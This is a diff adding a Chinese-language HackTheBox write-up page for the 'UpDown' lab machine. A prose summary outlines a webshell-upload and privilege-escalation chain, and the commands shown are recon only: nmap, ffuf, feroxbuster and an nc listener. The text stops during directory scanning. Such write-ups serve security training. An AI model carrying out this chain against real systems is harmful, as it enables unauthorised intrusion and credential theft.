@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P UpDown​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;493 首先對目標進行了 TCP 掃描，發">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - UpDown">
+<meta property="og:url" content="https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P UpDown​​ https:&#x2F;&#x2F;www.hackthebox.com&#x2F;achievement&#x2F;machine&#x2F;463126&#x2F;493 首先對目標進行了 TCP 掃描，發">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227081136-dm9zfgc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227020847-ekpq712.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042331-92rubaq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228030357-rzueh2m.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021228-zzn6bw6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021115-yx8oxs4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021151-s896jdi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021350-630y0tp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021432-zapsc3v.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042549-z4r762h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042943-vwiiynz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043121-f4ykwhq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043202-3ja04le.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228030732-jq1x1bf.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043327-zxsan01.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043335-l1t3a8k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227043351-u7qwq7a.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227045300-zyiqqpk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227044822-1rks77f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227044609-u5r13yl.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032622-5zikuf3.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032825-ls03dj8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032914-9wz13xa.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032932-meyqws0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032940-ci2yglx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228032949-50x3gtq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033143-n04053h.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033148-niw8ktq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228033230-gminz77.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050418-tzs1do8.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050754-98gp3aw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050804-vskx64z.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050816-q4dex9s.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227050922-v21a26j.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228034321-pl5cma4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228034453-5cqdjag.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051449-l35lbrz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051510-x5379cj.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227051225-q7gqwa2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227052729-6eaylsk.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054011-ap89f3b.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053801-tax0p6f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053652-ifpclr0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053847-6netyzu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227053937-7yah3tp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054515-20lyn26.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054525-pxwodvn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054618-5e0epo7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054044-m0heek2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054855-t3p181q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054731-yyc5w6q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227054829-vjobzq8.png">
+<meta property="article:published_time" content="2024-12-27T22:18:00.000Z">
+<meta property="article:modified_time" content="2024-12-27T22:19:46.406Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227081136-dm9zfgc.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - UpDown</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/12/28/2024-htb-machine/58-Tenten/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/28/2024-htb-machine/56-Interface/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&text=HackTheBox - Machine - UpDown"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&is_video=false&description=HackTheBox - Machine - UpDown"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - UpDown&body=Check out this article: https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&title=HackTheBox - Machine - UpDown"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&name=HackTheBox - Machine - UpDown&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/28/2024-htb-machine/57-UpDown/&t=HackTheBox - Machine - UpDown"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - UpDown
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-27T22:18:00.000Z" class="dt-published" itemprop="datePublished">2024-12-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="UpDown"><a href="#UpDown" class="headerlink" title="UpDown"></a>UpDown</h1><p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227081136-dm9zfgc.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/463126/493">https://www.hackthebox.com/achievement/machine/463126/493</a></p>
+<p>首先對目標進行了 TCP 掃描，發現只有 80 端口開放，並通過瀏覽器訪問後獲得了一個域名 siteisup.htb。接著，對其子域名進行了進一步的掃描，發現了 dev 子域名。隨後，啟動了本地 HTTP 服務器，並嘗試使用 nc 工具抓取版本信息，但未能獲得有用的框架或版本號。因為沒有明顯的內容，進一步掃描子目錄後發現了 &#x2F;dev 目錄，並成功下載了該目錄下的 .git 目錄，從中提取了 .htaccess 文件，該文件設置了訪問權限。通過添加請求頭 Special-Dev: only4dev，最終成功獲得了正常內容。分析源碼後發現上傳的文件會被存儲在 uploads 目錄中，並且存在對某些文件類型的過濾，從而可以利用不常見的 PHP 擴展進行上傳。為了延長上傳後的執行時間，通過在 PHP 木馬的尾部添加垃圾域名來達到超時效果，成功上傳了木馬並執行。接著，嘗試使用不同的文件擴展名進行上傳，最終以 phar 擴展成功執行了 phpinfo ()。然而，系統禁止了多種外部函數的執行，因此需要使用 p0wny-shell 或 weevely 來獲取反向 shell。由於 p0wny-shell 大小超過了上傳限制，選擇了 weevely，並通過 burp 代理進行請求頭的修改。經過配置後，成功上傳了木馬並獲得了 shell，隨後發現 &#x2F;home&#x2F;developer 目錄下有一個 SUID 程序 siteisup。運行該程序後，發現其背後的 Python 代碼存在漏洞，利用 Python 2 的 input () 函數特性，成功執行了惡意命令，獲得了更高的權限。最終，通過讀取 .ssh 目錄中的 id_rsa 文件，實現了 SSH 登錄，並利用 gtfobins 網站提供的 payload 獲得了 root 權限。</p>
+<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><p>首先日常使用 TCP 掃描一下。</p>
+<h2 id="Nmap-TCP-Scan"><a href="#Nmap-TCP-Scan" class="headerlink" title="Nmap TCP Scan"></a>Nmap TCP Scan</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -Pn -sS -p- -sC -sV -vv -oA save --<span class="built_in">min</span>-rate=<span class="number">1000</span> <span class="number">10.129</span><span class="number">.227</span><span class="number">.227</span></span><br><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh     syn-ack ttl <span class="number">63</span> OpenSSH <span class="number">8.2</span>p1 Ubuntu 4ubuntu0<span class="number">.5</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">3072</span> 9e:1f:<span class="number">98</span>:d7:c8:ba:<span class="number">61</span>:db:f1:<span class="number">49</span>:<span class="number">66</span>:9d:<span class="number">70</span>:<span class="number">17</span>:02:e7 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=</span><br><span class="line">|   <span class="number">256</span> c2:1c:fe:<span class="number">11</span>:<span class="number">52</span>:e3:d7:e5:f7:<span class="number">59</span>:<span class="number">18</span>:6b:<span class="number">68</span>:<span class="number">45</span>:3f:<span class="number">62</span> (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=</span><br><span class="line">|   <span class="number">256</span> 5f:6e:<span class="number">12</span>:<span class="number">67</span>:0a:<span class="number">66</span>:e8:e2:b7:<span class="number">61</span>:be:c4:<span class="number">14</span>:3a:d3:8e (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http    syn-ack ttl <span class="number">63</span> Apache httpd <span class="number">2.4</span><span class="number">.41</span> ((Ubuntu))</span><br><span class="line">|_http-title: Is my Website up ?</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span><span class="number">.41</span> (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>只有80端口，瀏覽器打開后出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227020847-ekpq712.png" alt="image">​</p>
+<p>上面有一個域名是 <code>siteisup.htb</code>​。​​</p>
+<h2 id="Sub-domain-scan"><a href="#Sub-domain-scan" class="headerlink" title="Sub-domain scan"></a>Sub-domain scan</h2><p>所以可以掃一下子域名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ffuf -u <span class="string">&quot;http://10.129.227.227&quot;</span>  -H <span class="string">&quot;Host: FUZZ.siteisup.htb&quot;</span> -w /Tools/Wordlists/N0kovoSubdomains/n0kovo_subdomains_small.txt  -fs <span class="number">1131</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227042331-92rubaq.png" alt="image">​</p>
+<p>得到一個子域名是 dev，打開后出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241228030357-rzueh2m.png" alt="image">​</p>
+<h1 id="Walk-around-on-siteisup-htb"><a href="#Walk-around-on-siteisup-htb" class="headerlink" title="Walk around on siteisup.htb"></a>Walk around on siteisup.htb</h1><p>回到 <code>siteisup.htb</code>​，開啓一個本地的http服務器： <code>python3 -m http.server 80</code>​，然後輸入自己的ip看一下會發生什麽：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021228-zzn6bw6.png" alt="image">​</p>
+<p>嘗試用nc抓取一下，看一下有沒有什麽版本信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp <span class="number">80</span> </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021115-yx8oxs4.png" alt="image">​</p>
+<p>看不到有任何的框架和版本號，如果只是輸入 ip 會得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021151-s896jdi.png" alt="image">​</p>
+<p>‍</p>
+<h2 id="Directory-scan-and-download-source-code-with-git-dumper"><a href="#Directory-scan-and-download-source-code-with-git-dumper" class="headerlink" title="Directory scan and download source code with git-dumper"></a>Directory scan and download source code with git-dumper</h2><p>由於什麽也沒有，嘗試掃描一下子目錄：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u <span class="string">&quot;http://10.129.227.227/&quot;</span> -w  /Tools/Wordlists/SecLists/Discovery/Web-Content/quickhits.txt -d <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-fg2TJfd1sEfz2u8s-UpDown/image-20241227021350-630y0tp.png" alt="image">​</p>
+<p>看到有一個 <code>/dev</code>​的子目錄，再次掃描：</p>
